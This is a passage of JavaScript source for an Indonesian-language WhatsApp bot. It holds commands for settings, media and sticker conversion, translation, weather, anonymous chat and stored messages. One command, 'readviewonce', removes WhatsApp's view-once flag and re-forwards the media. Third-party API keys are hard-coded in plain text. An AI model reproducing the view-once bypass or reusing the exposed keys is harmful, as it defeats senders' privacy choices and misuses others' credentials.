													id: ".bot readsw off"
												},
												{
													title: "Multi Prefix On🟢",
													description:
														"Mengaktifkan Multi Prefix",
													id: ".bot multiprefix on"
												},
												{
													title: "Multi Prefix Off🔴",
													description:
														"Mematikan Multi Prefix",
													id: ".bot multiprefix off"
												}
											]
										}
									]
								}
							}
						];
						await xzuya.sendButtonMsg(
							m.chat,
							"Bot Settings",
							ucapanWaktu,
							"Silahkan dipilih Owner🫡",
							null,
							buttonnya,
							m
						);
					} else if (text && isCreator) {
						if (text === "anticall on")
							(db.set[botNumber].anticall = true),
								m.reply("Sukses Mengaktifkan Anticall");
						if (text === "anticall off")
							(db.set[botNumber].anticall = false),
								m.reply("Sukses Mematikan Anticall");
						if (text === "autobio on")
							(db.set[botNumber].autobio = true),
								m.reply("Sukses Mengaktifkan Autobio");
						if (text === "autobio off")
							(db.set[botNumber].autobio = false),
								m.reply("Sukses Mematikan Autobio");
						if (text === "autoread on")
							(db.set[botNumber].autoread = true),
								m.reply("Sukses Mengaktifkan Autoread");
						if (text === "autoread off")
							(db.set[botNumber].autoread = false),
								m.reply("Sukses Mematikan Autoread");
						if (text === "autotype on")
							(db.set[botNumber].autotyping = true),
								m.reply("Sukses Mengaktifkan Autotype");
						if (text === "autotype off")
							(db.set[botNumber].autotyping = false),
								m.reply("Sukses Mematikan Autotype");
						if (text === "readsw on")
							(db.set[botNumber].readsw = true),
								m.reply("Sukses Mengaktifkan Read SW");
						if (text === "readsw off")
							(db.set[botNumber].readsw = false),
								m.reply("Sukses Mematikan Read SW");
						if (text === "multiprefix on")
							(db.set[botNumber].multiprefix = true),
								m.reply("Sukses Mengaktifkan Multiprefix");
						if (text === "multiprefix off")
							(db.set[botNumber].multiprefix = false),
								m.reply("Sukses Mematikan Multiprefix");
						let settingsBot = Object.entries(db.set[botNumber])
							.map(([key, value]) => {
								let qhk =
									typeof value === "boolean"
										? value
											? "on🟢"
											: "off🔴"
										: value;
								return `${
									key.charAt(0).toUpperCase() + key.slice(1)
								} : ${qhk}`;
							})
							.join("\n");
						if (text === "settings") m.reply(settingsBot);
					} else {
						xzuya.sendMessage(
							m.chat,
							{
								text: `*Bot Telah Online Selama*\n*${runtime(
									process.uptime()
								)}*`
							},
							{ quoted: m }
						);
					}
				}
				break;
			case "ping":
			case "botstatus":
			case "statusbot":
				{
					const used = process.memoryUsage();
					const cpus = os.cpus().map((cpu) => {
						cpu.total = Object.keys(cpu.times).reduce(
							(last, type) => last + cpu.times[type],
							0
						);
						return cpu;
					});
					const cpu = cpus.reduce(
						(last, cpu, _, { length }) => {
							last.total += cpu.total;
							last.speed += cpu.speed / length;
							last.times.user += cpu.times.user;
							last.times.nice += cpu.times.nice;
							last.times.sys += cpu.times.sys;
							last.times.idle += cpu.times.idle;
							last.times.irq += cpu.times.irq;
							return last;
						},
						{
							speed: 0,
							total: 0,
							times: {
								user: 0,
								nice: 0,
								sys: 0,
								idle: 0,
								irq: 0
							}
						}
					);
					let timestamp = speed();
					let latensi = speed() - timestamp;
					neww = performance.now();
					oldd = performance.now();
					respon = `Kecepatan Respon ${latensi.toFixed(
						4
					)} _Second_ \n ${
						oldd - neww
					} _miliseconds_\n\nRuntime : ${runtime(
						process.uptime()
					)}\n\n💻 Info Server\nRAM: ${formatp(
						os.totalmem() - os.freemem()
					)} / ${formatp(
						os.totalmem()
					)}\n\n_NodeJS Memory Usaage_\n${Object.keys(used)
						.map(
							(key, _, arr) =>
								`${key.padEnd(
									Math.max(...arr.map((v) => v.length)),
									" "
								)}: ${formatp(used[key])}`
						)
						.join("\n")}\n\n${
						cpus[0]
							? `_Total CPU Usage_\n${cpus[0].model.trim()} (${
									cpu.speed
							  } MHZ)\n${Object.keys(cpu.times)
									.map(
										(type) =>
											`- *${(type + "*").padEnd(6)}: ${(
												(100 * cpu.times[type]) /
												cpu.total
											).toFixed(2)}%`
									)
									.join("\n")}\n_CPU Core(s) Usage (${
									cpus.length
							  } Core CPU)_\n${cpus
									.map(
										(cpu, i) =>
											`${i + 1}. ${cpu.model.trim()} (${
												cpu.speed
											} MHZ)\n${Object.keys(cpu.times)
												.map(
													(type) =>
														`- *${(
															type + "*"
														).padEnd(6)}: ${(
															(100 *
																cpu.times[
																	type
																]) /
															cpu.total
														).toFixed(2)}%`
												)
												.join("\n")}`
									)
									.join("\n\n")}`
							: ""
					}`.trim();
					m.reply(respon);
				}
				break;
			case "speedtest":
			case "speed":
				{
					m.reply("Testing Speed...");
					let cp = require("child_process");
					let { promisify } = require("util");
					let exec = promisify(cp.exec).bind(cp);
					let o;
					try {
						o = await exec("python3 speed.py");
					} catch (e) {
						o = e;
					} finally {
						let { stdout, stderr } = o;
						if (stdout.trim()) m.reply(stdout);
						if (stderr.trim()) m.reply(stderr);
					}
				}
				break;
			case "afk":
				{
					let user = db.users[m.sender];
					user.afkTime = +new Date();
					user.afkReason = text;
					m.reply(
						`@${m.sender.split("@")[0]} Telah Afk${
							text ? ": " + text : ""
						}`
					);
				}
				break;
			case "readviewonce":
			case "readviewone":
			case "rvo":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					if (!m.quoted)
						return m.reply(
							`Reply view once message\nExample: ${
								prefix + command
							}`
						);
					try {
						if (m.quoted.msg.viewOnce) {
							m.quoted.msg.viewOnce = false;
							await xzuya.sendMessage(
								m.chat,
								{ forward: m.quoted },
								{ quoted: m }
							);
						} else if (
							m.quoted.msg.message &&
							m.quoted.msg.message.audioMessage &&
							m.quoted.msg.message.audioMessage.viewOnce
						) {
							m.quoted.msg.message.audioMessage.viewOnce = false;
							m.quoted.msg.message.audioMessage.contextInfo = {
								forwardingScore: 1,
								isForwarded: true,
								mentionedJid: [m.sender]
							};
							await xzuya.relayMessage(
								m.chat,
								m.quoted.msg.message,
								{}
							);
						} else {
							m.reply(
								`Reply view once message\nExample: ${
									prefix + command
								}`
							);
						}
					} catch (e) {
						m.reply("Media Tidak Valid!");
					}
				}
				break;
			case "inspect":
				{
					await jeda(2000);
					if (!text) return m.reply("Masukkan Link Group!");
					let code = q.match(/chat.whatsapp.com\/([\w\d]*)/g);
					if (code === null)
						return m.reply("No invite url detected.");
					code = code[0].replace("chat.whatsapp.com/", "");
					await xzuya
						.groupGetInviteInfo(code)
						.then((anu) => {
							let {
								id,
								subject,
								owner,
								subjectOwner,
								creation,
								desc,
								descId,
								participants,
								size,
								descOwner
							} = anu;
							console.log(anu);
							let par = `*Nama Gc* : ${subject}\n*ID* : ${id}\n${
								owner
									? `*Creator* : @${owner.split("@")[0]}`
									: "*Creator* : -"
							}\n*Jumlah Member* : ${size}\n*Gc Dibuat Tanggal* : ${new Date(
								creation * 1000
							).toLocaleString()}\n*DescID* : ${
								descId ? descId : "-"
							}\n${
								subjectOwner
									? `*Nama GC Diubah Oleh* : @${
											subjectOwner.split("@")[0]
									  }`
									: "*Nama GC Diubah Oleh* : -"
							}\n${
								descOwner
									? `*Desc diubah oleh* : @${
											descOwner.split("@")[0]
									  }`
									: "*Desc diubah oleh* : -"
							}\n\n*Desc* : ${desc ? desc : "-"}\n`;
							xzuya.sendTextMentions(m.chat, par, m);
						})
						.catch((res) => {
							if (res.data == 406)
								return m.reply("Grup Tidak Di Temukan❗");
							if (res.data == 410)
								return m.reply(
									"Url Grup Telah Di Setel Ulang❗"
								);
						});
				}
				break;
			case "addmsg":
				{
					if (!isCreator) return vipReply(mess.owner);
					if (!m.quoted)
						return m.reply(
							"Reply Pesan Yang Ingin Disave Di Database"
						);
					if (!text)
						return m.reply(
							`Example : ${prefix + command} file name`
						);
					let msgs = db.database;
					if (text.toLowerCase() in msgs)
						return m.reply(
							`'${text}' telah terdaftar di list pesan`
						);
					msgs[text.toLowerCase()] = m.quoted;
					delete msgs[text.toLowerCase()].chat;
					m.reply(
						`Berhasil menambahkan pesan di list pesan sebagai '${text}'\nAkses dengan ${prefix}getmsg ${text}\nLihat list Pesan Dengan ${prefix}listmsg`
					);
				}
				break;
			case "delmsg":
			case "deletemsg":
				{
					if (!isCreator) return vipReply(mess.owner);
					if (!text) return m.reply("Nama msg yg mau di delete?");
					let msgs = db.database;
					if (text == "allmsg") {
						db.database = {};
						m.reply(
							"Berhasil menghapus seluruh msg dari list pesan"
						);
					} else {
						if (!(text.toLowerCase() in msgs))
							return m.reply(
								`'${text}' tidak terdaftar didalam list pesan`
							);
						delete msgs[text.toLowerCase()];
						m.reply(`Berhasil menghapus '${text}' dari list pesan`);
					}
				}
				break;
			case "getmsg":
				{
					if (!isCreator) return vipReply(mess.owner);
					if (!text)
						return m.reply(
							`Example : ${
								prefix + command
							} file name\n\nLihat list pesan dengan ${prefix}listmsg`
						);
					let msgs = db.database;
					if (!(text.toLowerCase() in msgs))
						return m.reply(
							`'${text}' tidak terdaftar di list pesan`
						);
					await xzuya.relayMessage(
						m.chat,
						msgs[text.toLowerCase()],
						{}
					);
				}
				break;
			case "listmsg":
				{
					let seplit = Object.entries(db.database).map(
						([nama, isi]) => {
							return { nama, message: getContentType(isi) };
						}
					);
					let teks = "「 LIST DATABASE 」\n\n";
					for (let i of seplit) {
						teks += `${setv} *Name :* ${
							i.nama
						}\n${setv} *Type :* ${i.message?.replace(
							/Message/i,
							""
						)}\n───────────────\n`;
					}
					m.reply(teks);
				}
				break;
			case "q":
			case "quoted":
				{
					if (!m.quoted) return m.reply("Reply Pesannya!");
					const anu = await m.getQuotedObj();
					if (!anu) return m.reply("Format Tidak Tersedia!");
					if (!anu.quoted)
						return m.reply(
							"Pesan Yang Anda Reply Tidak Mengandung Reply"
						);
					await xzuya.relayMessage(
						m.chat,
						{ [anu.quoted.type]: anu.quoted.msg },
						{}
					);
				}
				break;
			case "confes":
			case "confess":
			case "menfes":
			case "menfess":
				{
					await jeda(2000);
					if (cekLimit(m, db)) return m.reply(mess.limit);
					if (m.isGroup) return m.reply(mess.private);
					if (menfes[m.sender])
						return m.reply(
							`Kamu Sedang Berada Di Sesi ${command}!`
						);
					if (!text)
						return m.reply(
							`Example : ${prefix + command} 62xxxx|Nama Samaran`
						);
					let [teks1, teks2] = text.split`|`;
					if (teks1) {
						const tujuan =
							teks1.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
						const onWa = await xzuya.onWhatsApp(tujuan);
						if (!onWa.length > 0)
							return m.reply(
								"Nomer Tersebut Tidak Terdaftar Di Whatsapp!"
							);
						menfes[m.sender] = {
							tujuan: tujuan,
							nama: teks2 ? teks2 : "Orang",
							waktu: setTimeout(() => {
								if (menfes[m.sender])
									m.reply(`_Waktu ${command} habis_`);
								delete menfes[m.sender];
							}, 600000)
						};
						menfes[tujuan] = {
							tujuan: m.sender,
							nama: "Penerima",
							waktu: setTimeout(() => {
								if (menfes[tujuan])
									xzuya.sendMessage(tujuan, {
										text: `_Waktu ${command} habis_`
									});
								delete menfes[tujuan];
							}, 600000)
						};
						xzuya.sendMessage(tujuan, {
							text: `_${command} connected_\n*Note :* jika ingin mengakhiri ketik _*${prefix}del${command}*_`
						});
						m.reply(
							`_Memulai ${command}..._\n*Silahkan Mulai kirim pesan/media*\n*Durasi ${command} hanya selama 10 menit*\n*Note :* jika ingin mengakhiri ketik _*${prefix}del${command}*_`
						);
					} else {
						m.reply(
							`Masukkan Nomernya!\nExample : ${
								prefix + command
							} 62xxxx|Nama Samaran`
						);
					}
				}
				break;
			case "delconfes":
			case "delconfess":
			case "delmenfes":
			case "delmenfess":
				{
					await jeda(2000);
					if (!menfes[m.sender])
						return m.reply(
							`Kamu Tidak Sedang Berada Di Sesi ${
								command.split("del")[1]
							}!`
						);
					let anu = menfes[m.sender];
					xzuya.sendMessage(anu.tujuan, {
						text: `Chat Di Akhiri Oleh ${
							anu.nama ? anu.nama : "Seseorang"
						}`
					});
					m.reply(
						`Sukses Mengakhiri Sesi ${command.split("del")[1]}!`
					);
					delete menfes[anu.tujuan];
					delete menfes[m.sender];
				}
				break;

			// Tools Menu
			case "fetch":
			case "get":
				{
					await jeda(2000);
					if (!/^https?:\/\//.test(text))
						return m.reply("Awali dengan http:// atau https://");
					const { data } = await axios.get(
						"https://api.ipify.org?format=json"
					);
					try {
						const res = await axios.get(
							isUrl(text) ? isUrl(text)[0] : text
						);
						if (
							!/json|html|plain/.test(res.headers["content-type"])
						) {
							await m.reply(text);
						} else {
							m.reply(
								util
									.format(res.data)
									.replace(
										new RegExp(
											data.ip.replace(/\./g, "\\."),
											"g"
										),
										"xxx-xxx-xxx-xxx"
									)
							);
						}
					} catch (e) {
						m.reply(
							util
								.format(e)
								.replace(
									new RegExp(
										data.ip.replace(/\./g, "\\."),
										"g"
									),
									"xxx-xxx-xxx-xxx"
								)
						);
					}
				}
				break;
			case "toaud":
			case "toaudio":
				{
					await jeda(2000);
					if (cekLimit(m, db)) return m.reply(mess.limit);
					if (!/video|audio/.test(mime))
						return m.reply(
							`Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${
								prefix + command
							}`
						);
					vipReply(mess.wait);
					let media = await (m.quoted
						? m.quoted.download()
						: m.download());
					let audio = await toAudio(media, "mp4");
					await xzuya.sendMessage(
						m.chat,
						{ audio: audio, mimetype: "audio/mpeg" },
						{ quoted: m }
					);
					db.users[m.sender].limit -= 1;
				}
				break;
			case "tomp3":
				{
					await jeda(2000);
					if (cekLimit(m, db)) return m.reply(mess.limit);
					if (!/video|audio/.test(mime))
						return m.reply(
							`Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${
								prefix + command
							}`
						);
					vipReply(mess.wait);
					let media = await (m.quoted
						? m.quoted.download()
						: m.download());
					let audio = await toAudio(media, "mp4");
					await xzuya.sendMessage(
						m.chat,
						{
							document: audio,
							mimetype: "audio/mpeg",
							fileName: `Convert By xzuya Bot.mp3`
						},
						{ quoted: m }
					);
				}
				break;
			case "tovn":
			case "toptt":
			case "tovoice":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					if (cekLimit(m, db)) return m.reply(mess.limit);
					if (!/video|audio/.test(mime))
						return m.reply(
							`Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${
								prefix + command
							}`
						);
					vipReply(mess.wait);
					let media = await (m.quoted
						? m.quoted.download()
						: m.download());
					let audio = await toPTT(media, "mp4");
					await xzuya.sendMessage(
						m.chat,
						{
							audio: audio,
							mimetype: "audio/ogg; codecs=opus",
							ptt: true
						},
						{ quoted: m }
					);
					db.users[m.sender].limit -= 1;
				}
				break;
			case "togif":
				{
					await jeda(2000);
					if (cekLimit(m, db)) return m.reply(mess.limit);
					if (!/webp|video/.test(mime))
						return m.reply(
							`Reply Video/Stiker dengan caption *${
								prefix + command
							}*`
						);
					vipReply(mess.wait);
					let media = await xzuya.downloadAndSaveMediaMessage(qmsg);
					let ran = `./database/sampah/${getRandom(".gif")}`;
					exec(`convert ${media} ${ran}`, (err) => {
						fs.unlinkSync(media);
						if (err) return m.reply("Gagal❗");
						let buffer = fs.readFileSync(ran);
						xzuya.sendMessage(
							m.chat,
							{ video: buffer, gifPlayback: true },
							{ quoted: m }
						);
						fs.unlinkSync(ran);
					});
					db.users[m.sender].limit -= 1;
				}
				break;
			case "toimage":
			case "toimg":
				{
					await jeda(2000);
					if (cekLimit(m, db)) return m.reply(mess.limit);
					if (!/webp|video/.test(mime))
						return m.reply(
							`Reply Video/Stiker dengan caption *${
								prefix + command
							}*`
						);
					vipReply(mess.wait);
					let media = await xzuya.downloadAndSaveMediaMessage(qmsg);
					let ran = `./database/sampah/${getRandom(".png")}`;
					exec(`convert ${media}[0] ${ran}`, (err) => {
						fs.unlinkSync(media);
						if (err) return m.reply("Gagal❗");
						let buffer = fs.readFileSync(ran);
						xzuya.sendMessage(
							m.chat,
							{ image: buffer },
							{ quoted: m }
						);
						fs.unlinkSync(ran);
					});
					db.users[m.sender].limit -= 1;
				}
				break;
			case "toptv":
				{
					await jeda(2000);
					if (!/video/.test(mime))
						return m.reply(
							`Kirim/Reply Video Yang Ingin Dijadikan PTV Message Dengan Caption ${
								prefix + command
							}`
						);
					if (
						(m.quoted ? m.quoted.type : m.type) === "videoMessage"
					) {
						const anu = await (m.quoted
							? m.quoted.download()
							: m.download());
						const msg = await generateWAMessageContent(
							{ video: anu },
							{ upload: xzuya.waUploadToServer }
						);
						await xzuya.relayMessage(
							m.chat,
							{ ptvMessage: msg.videoMessage },
							{}
						);
					} else {
						m.reply("Reply Video Yang Mau Di Ubah Ke PTV Message!");
					}
					db.users[m.sender].limit -= 1;
				}
				break;
			case "tourl":
				{
					await jeda(2000);
					try {
						let { fileIO, TelegraPh } = require("./lib/uploader");
						if (/jpg|jpeg|png/.test(mime)) {
							vipReply(mess.wait);
							let media = await (m.quoted
								? m.quoted.download()
								: m.download());
							let anu = await TelegraPh(media);
							m.reply("Url : " + anu);
						} else if (/webp|video|sticker|audio/.test(mime)) {
							vipReply(mess.wait);
							let media = await (m.quoted
								? m.quoted.download()
								: m.download());
							let anu = await UguuSe(media);
							m.reply("Url : " + anu.url);
						} else {
							m.reply("Send Media yg ingin di Upload!");
						}
					} catch (e) {
						m.reply("Server Uploader sedang offline!");
					}
					db.users[m.sender].limit -= 1;
				}
				break;
			case "texttospech":
			case "tts":
			case "tospech":
				{
					await jeda(2000);
					if (!text)
						return m.reply(
							"Mana text yg mau diubah menjadi audio?"
						);
					let { tts } = require("./lib/tts");
					let anu = await tts(text);
					xzuya.sendMessage(
						m.chat,
						{ audio: anu, ptt: true, mimetype: "audio/mpeg" },
						{ quoted: m }
					);
					db.users[m.sender].limit -= 1;
				}
				break;
			case "translate":
			case "tr":
				{
					await jeda(2000);
					if (text && text == "list") {
						let list_tr = `╭──❍「 *Kode Bahasa* 」❍\n│• af : Afrikaans\n│• ar : Arab\n│• zh : Chinese\n│• en : English\n│• en-us : English (United States)\n│• fr : French\n│• de : German\n│• hi : Hindi\n│• hu : Hungarian\n│• is : Icelandic\n│• id : Indonesian\n│• it : Italian\n│• ja : Japanese\n│• ko : Korean\n│• la : Latin\n│• no : Norwegian\n│• pt : Portuguese\n│• pt : Portuguese\n│• pt-br : Portuguese (Brazil)\n│• ro : Romanian\n│• ru : Russian\n│• sr : Serbian\n│• es : Spanish\n│• sv : Swedish\n│• ta : Tamil\n│• th : Thai\n│• tr : Turkish\n│• vi : Vietnamese\n╰──────❍`;
						m.reply(list_tr);
					} else {
						if (!m.quoted && (!text || !args[1]))
							return m.reply(
								`Kirim/reply text dengan caption ${
									prefix + command
								}`
							);
						let lang = args[0] ? args[0] : "id";
						let teks = args[1]
							? args.slice(1).join(" ")
							: m.quoted.text;
						try {
							let hasil = await translate(teks, {
								to: lang,
								autoCorrect: true
							});
							m.reply(`To : ${lang}\n${hasil[0]}`);
						} catch (e) {
							m.reply(
								`Lang *${lang}* Tidak Di temukan!\nSilahkan lihat list, ${
									prefix + command
								} list`
							);
						}
					}
					db.users[m.sender].limit -= 1;
				}
				break;
			case "toqr":
			case "qr":
				{
					await jeda(2000);
					if (!text)
						return m.reply(
							`Ubah Text ke Qr dengan *${
								prefix + command
							}* textnya`
						);
					vipReply(mess.wait);
					await xzuya.sendMessage(
						m.chat,
						{
							image: {
								url:
									"https://api.qrserver.com/v1/create-qr-code/?size=1000x1000&data=" +
									text
							},
							caption: "Nih Bro"
						},
						{ quoted: m }
					);
					db.users[m.sender].limit -= 1;
				}
				break;
			case "tohd":
			case "remini":
			case "hd":
				{
					await jeda(2000);
					if (/image/.test(mime)) {
						const { remini } = require("./lib/remini");
						let media = await (m.quoted
							? m.quoted.download()
							: m.download());
						remini(media, "enhance").then((a) => {
							xzuya.sendMessage(
								m.chat,
								{ image: a, caption: "Done" },
								{ quoted: m }
							);
						});
					} else {
						m.reply(
							`Kirim/Reply Gambar dengan format\nExample: ${
								prefix + command
							}`
						);
					}
					db.users[m.sender].limit -= 1;
				}
				break;
			case "ssweb":
				{
					await jeda(2000);
					if (!text)
						return m.reply(
							`Example: ${
								prefix + command
							} https://github.com/xzuyadev/xzuya-md`
						);
					try {
						if (!text.startsWith("http")) {
							let buf =
								"https://image.thum.io/get/width/1900/crop/1000/fullpage/https://" +
								q;
							await xzuya.sendMessage(
								m.chat,
								{ image: { url: buf }, caption: "Done" },
								{ quoted: m }
							);
						} else {
							let buf =
								"https://image.thum.io/get/width/1900/crop/1000/fullpage/" +
								q;
							await xzuya.sendMessage(
								m.chat,
								{ image: { url: buf }, caption: "Done" },
								{ quoted: m }
							);
						}
					} catch (e) {
						m.reply("Server SS web Sedang Offline!");
					}
					db.users[m.sender].limit -= 1;
				}
				break;
			case "readmore":
				{
					await jeda(2000);
					let teks1 = text.split`|`[0] ? text.split`|`[0] : "";
					let teks2 = text.split`|`[1] ? text.split`|`[1] : "";
					m.reply(teks1 + readmore + teks2);
					db.users[m.sender].limit -= 1;
				}
				break;
			case "getexif":
				{
					if (!m.quoted)
						return m.reply(
							`Reply sticker\nDengan caption ${prefix + command}`
						);
					if (!/sticker|webp/.test(quoted.type))
						return m.reply(
							`Reply sticker\nDengan caption ${prefix + command}`
						);
					const { Image } = require("node-webpmux");
					const img = new Image();
					await img.load(await m.quoted.download());
					m.reply(
						util.format(JSON.parse(img.exif.slice(22).toString()))
					);
				}
				break;
			case "cuaca":
			case "weather":
				{
					await jeda(2000);
					if (!text)
						return vipReply(
							`Example :  ${prefix + command} jakarta`
						);
					try {
						let data = await fetchJson(
							`https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
						);
						m.reply(
							`*🏙 Cuaca Kota ${data.name}*\n\n*🌤️ Cuaca :* ${data.weather[0].main}\n*📝 Deskripsi :* ${data.weather[0].description}\n*🌡️ Suhu Rata-rata :* ${data.main.temp} °C\n*🤔 Terasa Seperti :* ${data.main.feels_like} °C\n*🌬️ Tekanan :* ${data.main.pressure} hPa\n*💧 Kelembapan :* ${data.main.humidity}%\n*🌪️ Kecepatan Angin :* ${data.wind.speed} Km/h\n*📍Lokasi :*\n- *Bujur :* ${data.coord.lat}\n- *Lintang :* ${data.coord.lon}\n*🌏 Negara :* ${data.sys.country}`
						);
					} catch (e) {
						m.reply("Kota Tidak Di Temukan!");
					}
					db.users[m.sender].limit -= 1;
				}
				break;
			case "sticker":
			case "stiker":
			case "s":
			case "stickergif":
			case "stikergif":
			case "sgif":
				{
					await jeda(2000);
					if (!/image|video|sticker/.test(quoted.type))
						return m.reply(
							`Kirim/reply gambar/video/gif dengan caption ${
								prefix + command
							}\nDurasi Image/Video/Gif 1-9 Detik`
						);
					let media = await (m.quoted
						? m.quoted.download()
						: m.download());
					if (/image|webp/.test(mime)) {
						vipReply(mess.wait);
						if (text == "meta") {
							await xzuya.sendAsSticker(m.chat, media, m, {
								packname: packname,
								author: author,
								isAvatar: 1
							});
						} else {
							await xzuya.sendAsSticker(m.chat, media, m, {
								packname: packname,
								author: author
							});
						}
					} else if (/video/.test(mime)) {
						if ((quoted.msg || quoted).seconds > 11)
							return m.reply("Maksimal 10 detik!");
						vipReply(mess.wait);
						await xzuya.sendAsSticker(m.chat, media, m, {
							packname: packname,
							author: author
						});
					} else {
						m.reply(
							`Kirim/reply gambar/video/gif dengan caption ${
								prefix + command
							}\nDurasi Image/Video/Gif 1-9 Detik`
						);
					}
					db.users[m.sender].limit -= 1;
				}
				break;
			case "stickerwm":
			case "swm":
			case "curi":
			case "colong":
			case "take":
			case "stickergifwm":
			case "sgifwm":
				{
					await jeda(2000);
					if (!/image|video|sticker/.test(quoted.type))
						return m.reply(
							`Kirim/reply gambar/video/gif dengan caption ${
								prefix + command
							}\nDurasi Image/Video/Gif 1-9 Detik`
						);
					let media = await (m.quoted
						? m.quoted.download()
						: m.download());
					let teks1 = text.split`|`[0] ? text.split`|`[0] : " ";
					let teks2 = text.split`|`[1] ? text.split`|`[1] : " ";
					if (/image|webp/.test(mime)) {
						vipReply(mess.wait);
						if (text == "meta") {
							await xzuya.sendAsSticker(m.chat, media, m, {
								packname: teks1,
								author: teks2,
								isAvatar: 1
							});
						} else {
							await xzuya.sendAsSticker(m.chat, media, m, {
								packname: teks1,
								author: teks2
							});
						}
					} else if (/video/.test(mime)) {
						if ((quoted.msg || quoted).seconds > 11)
							return m.reply("Maksimal 10 detik!");
						vipReply(mess.wait);
						await xzuya.sendAsSticker(m.chat, media, m, {
							packname: teks1,
							author: teks2
						});
					} else {
						m.reply(
							`Kirim/reply gambar/video/gif dengan caption ${
								prefix + command
							}\nDurasi Video/Gif 1-9 Detik`
						);
					}
					db.users[m.sender].limit -= 1;
				}
				break;
			case "smeme":
			case "stickmeme":
			case "stikmeme":
			case "stickermeme":
			case "stikermeme":
				{
					await jeda(2000);
					try {
						if (!isPremium) return m.reply(mess.prem);
						if (!/image|webp/.test(mime))
							return m.reply(
								`Kirim/reply image/sticker\nDengan caption ${
									prefix + command
								} atas|bawah`
							);
						if (!text)
							return m.reply(
								`Kirim/reply image/sticker dengan caption ${
									prefix + command
								} atas|bawah`
							);
						vipReply(mess.wait);
						let atas = text.split`|`[0] ? text.split`|`[0] : "-";
						let bawah = text.split`|`[1] ? text.split`|`[1] : "-";
						let media = await (m.quoted
							? m.quoted.download()
							: m.download());
						let mem = await UguuSe(media);
						let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(
							atas
						)}/${encodeURIComponent(bawah)}.png?background=${
							mem.url
						}`;
						await xzuya.sendAsSticker(m.chat, smeme, m, {
							packname: packname,
							author: author
						});
					} catch (e) {
						m.reply("Server Meme Sedang Offline!");
					}
					db.users[m.sender].limit -= 1;
				}
				break;
			case "emojimix":
				{
					await jeda(2000);
					if (!text)
						return vipReply(`Example :  ${prefix + command} 😅+🤔`);
					let [emoji1, emoji2] = text.split`+`;
					if (!emoji1 && !emoji2)
						return vipReply(`Example :  ${prefix + command} 😅+🤔`);
					try {
						let anu = await axios.get(
							`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(
								emoji1
							)}_${encodeURIComponent(emoji2)}`
						);
						if (anu.data.results.length < 1)
							return m.reply(
								`Mix Emoji ${text} Tidak Ditemukan!`
							);
						for (let res of anu.data.results) {
							await xzuya.sendAsSticker(m.chat, res.url, m, {
								packname: packname,
								author: author
							});
						}
					} catch (e) {
						m.reply("Gagal Mix Emoji!");
					}
					db.users[m.sender].limit -= 1;
				}
				break;
			case "qc":
			case "quote":
			case "fakechat":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					if (!text && !m.quoted)
						return m.reply(
							`Kirim/reply pesan *${prefix + command}* Teksnya`
						);
					try {
						let ppnya = await xzuya
							.profilePictureUrl(m.sender, "image")
							.catch(
								() =>
									"https://i.pinimg.com/564x/8a/e9/e9/8ae9e92fa4e69967aa61bf2bda967b7b.jpg"
							);
						let res = await quotedLyo(text, m.pushName, ppnya);
						await xzuya.sendAsSticker(
							m.chat,
							Buffer.from(res.result.image, "base64"),
							m,
							{ packname: packname, author: author }
						);
					} catch (e) {
						m.reply("Server Create Sedang Offline!");
					}
					db.users[m.sender].limit -= 1;
				}
				break;
			case "wasted":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					try {
						if (/jpg|jpeg|png/.test(mime)) {
							vipReply(mess.wait);
							let media = await (m.quoted
								? m.quoted.download()
								: m.download());
							let anu = await TelegraPh(media);
							await xzuya.sendFileUrl(
								m.chat,
								"https://some-random-api.com/canvas/wasted?avatar=" +
									anu,
								"Nih Bro",
								m
							);
						} else {
							m.reply("Send Media yg ingin di Upload!");
						}
					} catch (e) {
						m.reply("Server Canvas Sedang Offline!");
					}
					db.users[m.sender].limit -= 1;
				}
				break;
			case "trigger":
			case "triggered":
				{
					await jeda(2000);
					try {
						if (/jpg|jpeg|png/.test(mime)) {
							vipReply(mess.wait);
							let media = await (m.quoted
								? m.quoted.download()
								: m.download());
							let anu = await TelegraPh(media);
							await xzuya.sendMessage(
								m.chat,
								{
									document: {
										url:
											"https://some-random-api.com/canvas/triggered?avatar=" +
											anu
									},
									fileName: "triggered.gif",
									mimetype: "image/gif"
								},
								{ quoted: m }
							);
						} else {
							m.reply("Send Media yg ingin di Upload!");
						}
					} catch (e) {
						m.reply("Server Canvas Sedang Offline!");
					}
					db.users[m.sender].limit -= 1;
				}
				break;
			case "nulis":
				{
					await jeda(2000);
					m.reply(
						`*Example*\n${prefix}nuliskiri\n${prefix}nuliskanan\n${prefix}foliokiri\n${prefix}foliokanan`
					);
					db.users[m.sender].limit -= 1;
				}
				break;
			case "nuliskiri":
				{
					await jeda(2000);
					if (!text)
						return m.reply(
							`Kirim perintah *${prefix + command}* Teksnya`
						);
					vipReply(mess.wait);
					const splitText = text.replace(/(\S+\s*){1,9}/g, "$&\n");
					const fixHeight = splitText
						.split("\n")
						.slice(0, 31)
						.join("\n");
					spawn("convert", [
						"./src/nulis/images/buku/sebelumkiri.jpg",
						"-font",
						"./src/nulis/font/Indie-Flower.ttf",
						"-size",
						"960x1280",
						"-pointsize",
						"23",
						"-interline-spacing",
						"2",
						"-annotate",
						"+140+153",
						fixHeight,
						"./src/nulis/images/buku/setelahkiri.jpg"
					])
						.on("error", () => m.reply(mess.error))
						.on("exit", () => {
							xzuya.sendMessage(
								m.chat,
								{
									image: fs.readFileSync(
										"./src/nulis/images/buku/setelahkiri.jpg"
									),
									caption:
										"Jangan Malas Lord. Jadilah siswa yang rajin ರ_ರ"
								},
								{ quoted: m }
							);
						});
					db.users[m.sender].limit -= 1;
				}
				break;
			case "nuliskanan":
				{
					await jeda(2000);
					if (!text)
						return m.reply(
